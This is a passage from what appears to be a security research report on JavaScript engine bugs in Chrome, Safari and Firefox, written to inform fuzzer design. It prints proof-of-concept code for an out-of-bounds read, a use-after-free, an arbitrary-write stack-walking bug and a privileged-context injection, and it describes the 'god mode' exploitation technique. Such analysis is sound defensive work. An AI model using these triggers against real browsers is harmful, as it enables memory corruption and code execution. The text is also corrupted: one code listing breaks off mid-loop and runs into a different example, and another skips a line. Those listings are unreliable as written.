• 
This vulnerability demonstrates that redefined callbacks can be combined with 
techniques mentioned in chapter 4.2.2 where integer overflows were discussed. 
104 https://bugs.chromium.org/p/chromium/issues/detail?id=938251 
105 https://bugs.chromium.org/p/project-
zero/issues/attachment?aid=402215&signed_aid=uJieSMQe19F_G21FV0OaCg== 
53 
Chromium issue 682194, CVE-2017-5030 – OOB read in v8 Array.concat 
01: var p = new Proxy([], {}); 
02: var b_dp = Object.prototype.defineProperty; 
03: class MyArray extends Array { 
04:     static get [Symbol.species]() { 
05:         return function () { return p; } 
06:     }; // custom constructor which returns a proxy object 
07: } 
08: var w = new MyArray(100); 
09: w[1] = 0.1; 
10: w[2] = 0.1; 
11: function gc() { 
12:     for (var i = 0; i  { 
07:     array.length = 1; // shrink elements array 
08:     array.length = 0; // replace elements array with empty array 
09:     // restore the original length, causing a new elements array  
10:     array.length = ARRAY_LEN; 
11: } 
12: array.sort(compareFn); 
In line 12 the sort function is called with a callback function passed as argument. The callback 
function first sets in line 7 the array length to one which shrinks the elements array. Next, 
line 8 sets the length to zero which updates the array buffer to point to an empty array. 
Finally, the original array length is restored in line 10. The array length is therefore 
unmodified after the execution of the callback, but the array buffer now points to a different 
memory location. Since the C++ implementation of the sort function stored the array buffer 
pointer in a local variable, this leads to a use-after-free vulnerability. Restoring the original 
length is important to bypass code which just checks for array modifications based on the 
length field. 
An exploit is available in the bug tracker 108. 
Generalization for variation analysis: 
• 
A fuzzer should add code in callbacks which sets the array length to one, then to zero 
and then back to the original length. These operations should be added more 
frequently for arrays with a connection to the callback function. In the above PoC the 
array variable has a connection because the compareFn function is passed to the 
sort function which is called on the array variable. The compareFn function and the 
array variable therefore have a connection. 
108 https://bugs.chromium.org/p/chromium/issues/detail?id=852592 
57 
4.4 Privileged JavaScript execution 
Depending on the browser, some internal websites are marked as privileged which can run 
JavaScript code in a privileged context. This allows the code to access critical functionality 
such as native functions or access file system APIs which can be turned into arbitrary code 
execution. Vulnerabilities in this chapter are thus browser specific. 
The privileged JavaScript context is also commonly used during exploitation. For example, 
in Firefox a vulnerability can be used to set a flag to enable the privileged context. Afterwards, 
the privileged context can be used to achieve full code execution. This exploitation technique 
is called god mode and to apply it, a vulnerability must just be turned into an arbitrary write 
to achieve full code execution. This technique was first publicly used 109 during Pwn2Own 
2014 to exploit CVE-2014-1513. Another exploit demonstrating this attack technique is 
available 110 for CVE-2019-9810. 
4.4.1 Stack walking vulnerabilities 
Most JavaScript built-in functions are implemented in C++. However, some built-in functions 
are directly implemented in JavaScript. In v8 a third option is Torque, a language designed 
to translate the ECMAScript specification into optimizable code. 
To implement the functions in JavaScript, the code sometimes requires accessing native 
C++ functions. In JSC, the JavaScript engine of Apple Safari, these native functions can be 
called by prefixing the function with an @ symbol such as @concatMemcpy. These functions 
are not available from a normal JavaScript context, otherwise a call to memcpy() could easily 
be turned to a memory corruption vulnerability. If a built-in function, that is implemented in 
JavaScript and that uses such native functions, can be tricked into invoking a callback, a 
reference to the native function can be obtained. Callbacks can be invoked by passing a 
callback function as argument or by using one of the redefinition techniques explained in 
chapter 4.3. 
To obtain a reference to the native function inside the callback, the caller variable can be 
used. This variable stores a reference to the calling function. This is the case if the calling 
function does not use the JavaScript strict mode 111. To protect against stack walking 
vulnerabilities the strict mode must therefore be enabled at the beginning of built-in functions 
which can trigger a callback. 
109 https://bugzilla.mozilla.org/show_bug.cgi?id=982974 
110 https://github.com/0vercl0k/CVE-2019-11708 
111 https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Strict_mode 
58 
Examples: 
Safari CVE-2017-2446 – Stack walking vulnerability 
01: var reference_concatMemcpy; 
02: function my_callback() { 
03:     reference_concatMemcpy = my_callback.caller; 
04:     return 7;   // Does not matter 
05: } 
06: var a = [1, 2, 3]; 
07: a.length = 4; // Force slow path 
08: Object.defineProperty(Array.prototype, "3", { get: my_callback }); 
09: [4, 5, 6].concat(a); 
10: reference_concatMemcpy(0x77777777, 0x77777777, 0); 
Line 9 invokes the concat function. A getter is defined in line 8 which gets later called during 
the execution of the concat function. The bug allowed to obtain a reference to the calling 
function as shown in line 3. The concat function internally called the @concatMemcpy 
function, which triggered the callback. The caller variable therefore holds a reference to 
@concatMemcpy which allows to write to arbitrary memory. 
The vulnerability report is available in the Google Project Zero bug tracker 112. A detailed 
writeup of the vulnerability together with an exploit is available at 113. To fix the vulnerability 
114 the caller variable was restricted from accessing native functions. 
Generalization for variation analysis: 
• 
Although the fix restricts the caller variable from accessing native functions, a fuzzer 
should attempt to add such code. Since this was only fixed in JSC, a similar 
vulnerability could occur in other browsers or in special circumstances. The fuzzer 
should add code which immediately triggers an injected crash as soon as the 
JavaScript code detects that a variable holds a reference to a native function. 
4.4.2 JavaScript code injection into privileged code 
If code can be executed on behalf of a privileged website, the code starts to run in the 
privileged context and can use the additional functionality to exploit the browser. This can 
be achieved by injecting code into the website if a handle to the site can be obtained and the 
Content-Security-Policy (CSP) can be bypassed or via a Cross-Site-Scripting (XSS) 
vulnerability on the website. In the first case, the browser can be exploited by setting its 
location to a data URI containing JavaScript code or by injecting JavaScript code via an 
innerHTML() call. Mozilla Firefox implements a sanitizer 115 to protect privileged pages 
against these attacks. The second option will not be discussed because XSS vulnerabilities 
are out-of-scope of this work. However, they can lead to full code execution as demonstrated 
112 https://bugs.chromium.org/p/project-zero/issues/detail?id=1032 
113 https://doar-e.github.io/blog/2018/07/14/cve-2017-2446-or-jscjsglobalobjectishavingabadtime/ 
114 https://github.com/WebKit/webkit/commit/f7303f96833aa65a9eec5643dba39cede8d01144 
115 https://blog.mozilla.org/security/2019/12/02/help-test-firefoxs-built-in-html-sanitizer-to-protect-against-uxss-
bugs/ 
59 
in 116. Another option is to register callback functions which may get triggered from a 
privileged JavaScript context without disabling privileges. 
Examples: 
Firefox bug 982906, CVE-2014-1510 (Pwn2Own 2014) – WebIDL privileged JavaScript 
injection 
01: var c = new mozRTCPeerConnection; 
02: c.createOffer(function () { }, function () { 
03:     window.open('chrome://browser/content/browser.xul', 'my_iframe_id}'); 
04:     step1(); 
05: }); 
06: function step1() { 
07:     var clear = setInterval(function () { 
08:         frames[0].frames[2].location;       // throws an error when chrome iframe is not loaded yet 
09:         frames[0].frames[2].location = window.atob(' 
10:             BASE64_ENCODE("data:text/html,c = new mozRTCPeerConnection;c.createOffer(function()" + 
11:             "{},function(){top.vvv=window.open('chrome://browser/content/browser.xul', " + 
12:             "'abcd', 'chrome,top=-9999px,left=-9999px,height=100px,width=100px');})")'); 
13:         clearInterval(clear); 
14:         setTimeout(step2, 100); 
15:     }, 10); 
16: } 
17: function step2() { 
18:     var clear = setInterval(function () { 
19:         top.vvv.location = 'data:text/html,'; 
21:         clearInterval(clear); 
22:         setTimeout(step3, 100); 